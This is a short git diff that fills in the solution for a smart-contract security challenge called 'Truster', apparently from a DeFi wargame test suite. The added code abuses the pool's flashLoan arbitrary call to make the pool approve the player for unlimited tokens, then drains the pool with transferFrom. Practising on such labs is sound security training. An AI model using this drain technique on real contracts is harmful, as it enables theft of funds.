@@ -23,6 +23,19 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let encoder = new ethers.utils.AbiCoder;
+        let encodedData = encoder.encode(
+            ['address', 'uint256'], 
+            [  
+                player.address, 
+                ethers.constants.MaxUint256
+            ]
+        )
+        
+        await pool.connect(player).flashLoan(0, player.address, token.address, 
+            ethers.utils.id('approve(address,uint256)').substring(0, 10) + encodedData.substring(2))
+
+        await token.connect(player).transferFrom(pool.address, player.address, await token.balanceOf(pool.address))
     });
 
     after(async function () {
